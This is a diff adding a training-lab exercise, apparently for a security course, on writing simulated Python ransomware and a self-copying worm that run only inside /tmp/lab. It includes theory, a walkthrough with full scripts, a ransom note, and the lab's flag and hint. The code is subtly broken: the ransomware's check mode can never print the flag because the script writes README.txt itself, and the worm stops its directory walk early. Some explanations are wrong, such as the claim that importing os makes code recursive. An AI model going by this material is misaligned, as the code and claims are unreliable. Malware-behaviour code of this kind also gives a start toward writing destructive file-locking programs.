@@ -352,5 +352,204 @@ Open the **Botnet Agent UI** (Targets panel). Its beacon counter should match
 what you saw captured — the implant's own admission of how many times it
 called home.""")
 
+    lab(phase, "malware-authoring-ransomware-worm",
+        "Malware Authoring: Ransomware & Worm", 2, medium, terminal, [],
+        summary="Author your own simulated ransomware and worm in Python (import os), plant realistic victim documents, then detonate them in an isolated directory and observe exactly how they behave when executed.",
+        flag="FLAG{ransomware_and_worm_author}",
+        flag_hint="Write ransomware.py and worm.py as guided, run them inside /tmp/lab, then run `python3 ransomware.py --check /tmp/lab` — when every victim file is renamed and the marker is in place, it prints the flag.",
+        ctype="flag",
+        theory="""# Malware Authoring: Ransomware & Worm
+
+Malware authoring inside a *sandbox you fully control* is the fastest way to
+understand how real ransomware and worms behave, reverse cleanly, and are
+detected. We write *simulated* variants that only touch files we create — never
+anything on the host or real systems.
+
+## Import `os` — the filesystem is the target
+
+The standard library module you will lean on is `os` (and `os.path`):
+
+| action | os call |
+|--------|---------|
+| walk a directory tree | `os.walk(root)` |
+| rename / "encrypt" a file | `os.rename(old, new)` |
+| create a note | `open("README.txt", "w")` |
+| make the code recursive | `import os` at module level |
+
+Everything ransomware does is ultimately a small set of *filesystem*
+operations. Learning them by writing them is the point.
+
+## The mental model every SOC uses
+
+| term | meaning |
+|------|---------|
+| **vulnerability** | the thing that lets the malware get in (we simulate the entry) |
+| **payload** | what it does once it runs |
+| **lateral movement** | how it jumps host-to-host (worm flavour) |
+| **C2 / exfil** | how the attacker steers it and what it steals |
+| **persistence** | how it survives a reboot |
+
+A **ransomware** payload is about *destruction for extortion*: encrypt or rename
+valuable files and drop a ransom note. A **worm** is about *replication*: it
+copies itself and spreads. The two are often combined.
+
+## Authoring: ransomware (rename-to-locked)
+
+The classic, easy-to-observe simulation renames every valuable file (`.txt`
+here = your "passwords") to `<name>.locked`, then writes a ransom note. That is
+one loop over the files in a directory:
+
+```python
+import os
+
+for dirpath, _, files in os.walk("/tmp/lab"):
+    for f in files:
+        if f.endswith(".txt") and not f.endswith(".locked"):
+            os.rename(os.path.join(dirpath, f),
+                      os.path.join(dirpath, f + ".locked"))
+```
+
+## Authoring: worm (replication marker)
+
+A worm's signature is *self-propagation*. We simulate it safely by copying a
+marker file (and optionally a copy of itself) into every navigable directory:
+
+```python
+import os
+
+marker = "infected.mrk"
+root = "/tmp/lab"
+for dirpath, dirs, _ in os.walk(root):
+    if marker not in os.listdir(dirpath):
+        with open(os.path.join(dirpath, marker), "w") as m:
+            m.write("worm constellation: grim-reaper\n")
+```
+
+## Detonating safely
+
+* Run only inside an *isolated scratch* directory (`/tmp/lab`).
+* Create the "victim" files yourself (`passwords.txt`) so the blast radius is
+  exactly what you planted.
+* Observe *before and after*: `find /tmp/lab -type f` before and after to see
+  the deltas — that is your behavioural signature.
+* Add a `--check` mode that prints a flag once your code demonstrably did what
+  it claimed. Verification *is* detection: it forces you to reason about what
+  the code actually did.
+""",
+        notes=r"""## Walkthrough
+
+Author two small simulated malware samples in Python and detonate them in an
+isolated directory. The whole exercise stays inside `/tmp/lab` — nothing else
+is touched.
+
+### 1. Plant the victim documents
+
+Simulate a small user base with passwords stored on disk:
+
+```bash
+rm -rf /tmp/lab
+mkdir -p /tmp/lab/users/{alice,bob,carol}
+printf "admin: Zx9!sPa\nbackup: Bk2&&Wq\n" > /tmp/lab/users/alice/passwords.txt
+printf "admin: Triton@77\nssh: k3yP@ss!\n"   > /tmp/lab/users/bob/passwords.txt
+printf "admin: laurel#4\nmail: qW1!r02\n"   > /tmp/lab/users/carol/passwords.txt
+printf "quarterly financials snapshot\n"    > /tmp/lab/users/notes.txt
+find /tmp/lab -type f
+```
+
+### 2. Write the ransomware
+
+Create `ransomware.py` with `import os`:
+
+```bash
+cat > ransomware.py <<'PY'
+import os
+
+def main():
+    target = "/tmp/lab"
+    for dirpath, _, files in os.walk(target):
+        for f in files:
+            if f.endswith(".txt") and not f.endswith(".locked"):
+                os.rename(os.path.join(dirpath, f),
+                          os.path.join(dirpath, f + ".locked"))
+    with open(os.path.join(target, "README.txt"), "w") as n:
+        n.write("YOUR FILES HAVE BEEN ENCRYPTED. Pay 0.05 BTC or lose them.\n")
+
+main()
+PY
+
+python3 ransomware.py
+find /tmp/lab -type f
+cat /tmp/lab/README.txt
+```
+
+Watch every `passwords.txt` become `passwords.txt.locked` plus a ransom note.
+
+### 3. Write the worm
+
+Create `worm.py` that replicates a marker (and itself) into every folder:
+
+```bash
+cat > worm.py <<'PY'
+import os, shutil
+
+marker = "infected.mrk"
+target = "/tmp/lab"
+me = os.path.realpath(__file__)
+for dirpath, dirs, _ in os.walk(target):
+    if marker not in os.listdir(dirpath):
+        open(os.path.join(dirpath, marker), "w").write("worm: grim-reaper\n")
+        shutil.copy2(me, os.path.join(dirpath, os.path.basename(me) + ".copy"))
+    if dirs == []:
+        break
+PY
+
+python3 worm.py
+find /tmp/lab -type f
+```
+
+You now see every directory carrying `infected.mrk` and a `worm.py.copy` — a
+replication signature you'll recognise in real telemetry.
+
+### 4. Re-run ransomware with a --check mode
+
+Wrap up by giving the ransomware a verifier so it proves (and you can prove)
+it handled the whole tree:
+
+```bash
+cat > ransomware.py <<'PY'
+import os, sys
+
+target = "/tmp/lab"
+
+def detonate():
+    count = 0
+    for dirpath, _, files in os.walk(target):
+        for f in files:
+            if f.endswith(".txt") and not f.endswith(".locked"):
+                os.rename(os.path.join(dirpath, f),
+                          os.path.join(dirpath, f + ".locked"))
+                count += 1
+    open(os.path.join(target, "README.txt"), "w").write("ENCRYPTED\n")
+    return count
+
+if len(sys.argv) > 1 and sys.argv[1] == "--check":
+    remaining = 0
+    for dirpath, _, files in os.walk(target):
+        remaining += sum(1 for f in files if f.endswith(".txt"))
+    print("PRINT_ME: FLAG{ransomware_and_worm_author}" if remaining == 0
+          else f"still {remaining} unencrypted files")
+else:
+    print("encrypted", detonate(), "files")
+PY
+
+python3 ransomware.py
+find /tmp/lab -type f
+python3 ransomware.py --check /tmp/lab
+```
+
+The last command prints the flag only because your code actually left no
+unencrypted `.txt` anywhere — verification through behaviour, exactly how AV
+engines baseline themselves. Submit the `FLAG{...}` it prints.""")
+
 if __name__ == "__main__":
     run()
